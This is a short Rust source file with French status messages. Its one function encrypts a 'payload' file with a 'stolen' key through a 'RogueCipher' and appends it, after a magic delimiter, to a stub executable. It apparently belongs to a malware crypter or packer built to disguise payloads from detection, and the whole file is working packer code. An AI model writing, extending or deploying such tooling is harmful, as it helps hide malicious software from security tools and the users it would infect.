use crate::cypher;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::Path;

use crate::constants::{MAGIC_DELIMITER, XOR_KEY};

pub fn pack(payload_path: &str, stub_path: &std::path::PathBuf, ext: &str) {
    println!("Packing en cours...");

    let mut payload_data = fs::read(payload_path).expect("Impossible de lire le payload");
    let key = cypher::get_stolen_key();
    let cipher = cypher::RogueCipher::new(&key);
    cipher.encrypt_payload(&mut payload_data);

    let output_name = format!("{}_packed.{}",
        Path::new(payload_path).file_stem().unwrap().to_str().unwrap(),
        ext
    );

    let mut final_file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&output_name)
        .expect("Erreur création fichier");

    let stub_data = fs::read(stub_path).unwrap();

    final_file.write_all(&stub_data).unwrap();
    final_file.write_all(MAGIC_DELIMITER).unwrap();
    final_file.write_all(&payload_data).unwrap();

    println!("SUCCÈS ! Fichier généré : {}", output_name);
}
